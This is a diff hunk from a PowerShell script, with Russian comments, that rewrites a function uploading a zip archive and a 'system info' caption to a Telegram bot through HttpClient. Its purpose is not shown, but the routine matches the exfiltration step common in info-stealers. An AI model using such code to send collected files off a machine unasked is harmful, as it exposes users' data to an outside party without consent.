@@ -248,17 +248,37 @@ function Send-ResultToTelegram {
     )
     $caption = Get-Content $SystemInfoPath | Out-String
     $url = "https://api.telegram.org/bot$BotToken/sendDocument"
+    
     try {
-        $formData = @{
-            chat_id = $ChatID
-            caption = $caption
-            document = Get-Item $ZipPath
-        }
-        $resp = Invoke-RestMethod -Uri $url -Method Post -Form $formData
-        if ($resp.ok -eq $true) { return $true }
+        Add-Type -AssemblyName System.Net.Http
+        
+        $client = New-Object System.Net.Http.HttpClient
+        $form = New-Object System.Net.Http.MultipartFormDataContent
+
+        # Добавляем файл
+        $fileStream = [System.IO.File]::OpenRead($ZipPath)
+        $fileContent = New-Object System.Net.Http.StreamContent($fileStream)
+        $fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/zip")
+        $form.Add($fileContent, "document", [System.IO.Path]::GetFileName($ZipPath))
+
+        # Добавляем caption и chat_id
+        $form.Add((New-Object System.Net.Http.StringContent($ChatID)), "chat_id")
+        $form.Add((New-Object System.Net.Http.StringContent($caption)), "caption")
+
+        # Отправляем
+        $response = $client.PostAsync($url, $form).Result
+        $result = $response.Content.ReadAsStringAsync().Result
+        $fileStream.Dispose()
+        $form.Dispose()
+        $client.Dispose()
+        if ($response.StatusCode -eq [System.Net.HttpStatusCode]::OK) { return $true }
         else { return $false }
-    } catch { return $false }
+    }
+    catch {
+        return $false
+    }
 }
+
 
 
 
